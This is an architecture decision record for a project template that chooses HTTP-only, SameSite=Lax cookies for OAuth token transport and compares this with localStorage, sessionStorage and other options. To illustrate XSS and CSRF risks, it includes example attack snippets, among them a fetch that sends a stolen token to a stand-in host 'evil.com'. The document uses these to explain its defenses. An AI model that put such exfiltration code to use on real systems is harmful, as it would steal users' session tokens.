# ADR-009: Cookie-Based Authentication Transport

| Field | Value |
|-------|-------|
| **Status** | Accepted |
| **Date** | 2025-12-05 |
| **Decision Makers** | Project Team |

## Context

The project-starter template implements OAuth 2.0 Authorization Code flow with PKCE for user authentication. After the user authenticates with Keycloak, the backend receives access and refresh tokens. These tokens must be transported to the frontend and included in subsequent API requests. Key requirements:

1. **XSS Protection**: Tokens must not be accessible to JavaScript to prevent theft via XSS attacks
2. **CSRF Protection**: Token transport must not enable Cross-Site Request Forgery attacks
3. **Automatic Inclusion**: Tokens should be automatically included in requests without frontend code managing them
4. **Refresh Flow**: Refresh tokens must be securely stored for token renewal
5. **Browser Compatibility**: Solution must work across modern browsers

The frontend is a Lit-based SPA that communicates with the backend API via fetch requests.

## Decision

We use **HTTP-only cookies** for storing and transporting authentication tokens, with SameSite and Secure attributes for additional protection.

**Token Storage After OAuth Callback** (`backend/app/api/routers/oauth.py`):
```python
@router.get("/callback")
async def callback(request: Request, code: str, state: str, ...) -> RedirectResponse:
    # Exchange authorization code for tokens
    token_response = await oauth_client.exchange_code_for_token(code=code, code_verifier=code_verifier)

    response = RedirectResponse(url=redirect_uri, status_code=status.HTTP_302_FOUND)

    # Store access token in HTTP-only cookie
    response.set_cookie(
        key="access_token",
        value=token_response.access_token,
        httponly=True,                        # Not accessible to JavaScript
        secure=settings.SESSION_COOKIE_SECURE, # HTTPS only in production
        samesite="lax",                       # CSRF protection
        max_age=token_response.expires_in,   # Matches token expiration
    )

    # Store refresh token in HTTP-only cookie (long-lived)
    if token_response.refresh_token:
        response.set_cookie(
            key="refresh_token",
            value=token_response.refresh_token,
            httponly=True,
            secure=settings.SESSION_COOKIE_SECURE,
            samesite="lax",
            max_age=settings.SESSION_COOKIE_MAX_AGE,  # 7 days
        )
```

**PKCE State Cookies** (temporary, for OAuth flow):
```python
@router.get("/login")
async def login(request: Request, response: Response, ...) -> LoginResponse:
    authorization_url, state, pkce_challenge = await oauth_client.get_authorization_url()

    # Store state and code_verifier in HTTP-only cookies for callback validation
    response.set_cookie(
        key="oauth_state",
        value=state,
        httponly=True,
        secure=settings.SESSION_COOKIE_SECURE,
        samesite="lax",
        max_age=600,  # 10 minutes (short-lived for security)
    )

    if pkce_challenge:
        response.set_cookie(
            key="code_verifier",
            value=pkce_challenge.code_verifier,
            httponly=True,
            secure=settings.SESSION_COOKIE_SECURE,
            samesite="lax",
            max_age=600,
        )
```

**Configuration** (`backend/app/core/config.py`):
```python
# Session Configuration
SESSION_COOKIE_SECURE: bool = False  # Set True for HTTPS in production
SESSION_COOKIE_MAX_AGE: int = 86400 * 7  # Max age for session cookies (7 days)
```

## Consequences

### Positive

1. **XSS Protection**: `httponly=True` prevents JavaScript from accessing tokens. Even if an XSS vulnerability exists, attackers cannot steal tokens:
   ```javascript
   // Attacker's malicious script
   document.cookie  // access_token and refresh_token NOT visible
   fetch('/api/steal', {body: document.cookie})  // Tokens not leaked
   ```

2. **Automatic Transmission**: Browser automatically includes cookies in requests to the same origin. No frontend code needed to manage token headers:
   ```javascript
   // Frontend API call - cookies sent automatically
   fetch('/api/v1/protected', {credentials: 'include'})
   // Cookie: access_token=eyJhbG...; refresh_token=eyJhbG...
   ```

3. **CSRF Protection via SameSite**: `samesite="lax"` prevents cookies from being sent on cross-origin POST requests:
   ```html
   <!-- Attacker's site: evil.com -->
   <form action="https://app.com/api/transfer" method="POST">
     <!-- Cookies NOT sent due to SameSite=Lax -->
   </form>
   ```

4. **Secure Transport**: `secure=True` (in production) ensures cookies only sent over HTTPS, preventing interception on insecure networks

5. **Token Expiration Sync**: Cookie `max_age` matches token expiration, automatically cleaning up expired tokens:
   ```python
   max_age=token_response.expires_in  # e.g., 3600 for 1 hour token
   ```

6. **No Local Storage Risks**: Unlike localStorage/sessionStorage, cookies with httponly flag cannot be read by any JavaScript, including legitimate application code (reducing attack surface)

### Negative

1. **CSRF Considerations with Lax**: `SameSite=Lax` allows cookies on top-level GET navigations. State-changing endpoints must use POST/PUT/DELETE:
   ```python
   # SAFE: State-changing operations use POST
   @router.post("/auth/revoke")  # Cookies sent, but SameSite=Lax protects POST

   # RISK: If using GET for state changes (don't do this)
   @router.get("/auth/revoke")  # Cookies would be sent on cross-origin link click
   ```

2. **Cookie Size Limits**: Browsers limit cookies to ~4KB. JWTs with many claims can exceed this:
   ```
   # Typical sizes
   Access token: ~1KB (usually fine)
   Refresh token: ~2KB (usually fine)
   Combined with other cookies: may hit limits
   ```

3. **Subdomain Handling**: Cookies are scoped to domain. Multi-subdomain deployments need careful cookie domain configuration:
   ```python
   # For api.example.com and app.example.com
   response.set_cookie(..., domain=".example.com")  # Needs explicit config
   ```

4. **Mobile/Native App Compatibility**: HTTP-only cookies work for web browsers but complicate native mobile app integrations (may need separate token endpoint)

5. **Development vs Production**: `secure=False` required for localhost development over HTTP, creating configuration divergence

### Neutral

1. **SameSite=Lax vs Strict**: We chose `Lax` for better UX (allows cookies on top-level navigation) while still blocking cross-origin form submissions. `Strict` would break links from emails/other sites

2. **Stateful on Client**: Unlike Authorization header approach, cookies persist across browser sessions (if not cleared). This is intentional for "remember me" UX

## Alternatives Considered

### Authorization Header with localStorage

**Approach**: Store tokens in localStorage, send via `Authorization: Bearer <token>` header.

**Why Not Chosen**:
- **XSS Vulnerability**: JavaScript can read localStorage, enabling token theft:
  ```javascript
  // XSS attack can steal token
  const token = localStorage.getItem('access_token');
  fetch('https://evil.com/steal?token=' + token);
  ```
- **Frontend Complexity**: Every API call must manually add header
- **No Automatic Expiration**: localStorage doesn't auto-expire items

### Authorization Header with sessionStorage

**Approach**: Store tokens in sessionStorage for session-only persistence.

**Why Not Chosen**:
- **Same XSS Risk**: sessionStorage is also accessible to JavaScript
- **Session Loss**: Tokens lost when tab closes (poor UX for long sessions)
- **Still Requires Manual Headers**: Frontend must manage Authorization header

### Cookie with SameSite=Strict

**Approach**: Use `SameSite=Strict` for maximum CSRF protection.

**Why Not Chosen**:
- **Navigation Breaks**: Cookies not sent when navigating from external links
- **Poor UX**: Links from emails, Slack, etc. would require re-authentication
- **Lax Sufficient**: State-changing operations use POST, which Lax protects

### Encrypted Cookies

**Approach**: Encrypt token before storing in cookie, decrypt on server.

**Why Not Chosen**:
- **Complexity**: Adds encryption key management
- **No Additional Security**: httponly + secure already prevents interception
- **Performance**: Encryption/decryption overhead on every request
- **JWT Already Signed**: Token integrity already verified via signature

### BFF (Backend for Frontend) Pattern

**Approach**: Dedicated backend service manages tokens, issues session IDs to frontend.

**Why Not Chosen**:
- **Complexity**: Additional service to maintain
- **Indirection**: Adds latency and failure points
- **Overkill**: Direct cookie storage achieves same security goals simpler

---

## Related ADRs

- [ADR-004: Keycloak as Identity Provider](./004-keycloak-identity-provider.md) - OAuth token issuance
- [ADR-007: Redis Token Revocation Strategy](./007-redis-token-revocation.md) - Token invalidation
- [ADR-013: PKCE Enforcement for Public Clients](./013-pkce-enforcement-public-clients.md) - PKCE in OAuth flow

## Implementation References

- `backend/app/api/routers/oauth.py` - Cookie setting in OAuth callback
- `backend/app/core/config.py` - `SESSION_COOKIE_SECURE`, `SESSION_COOKIE_MAX_AGE`
- `frontend/src/api/client.ts` - Fetch with `credentials: 'include'`
- `backend/app/api/dependencies/auth.py` - Token extraction from cookies/headers
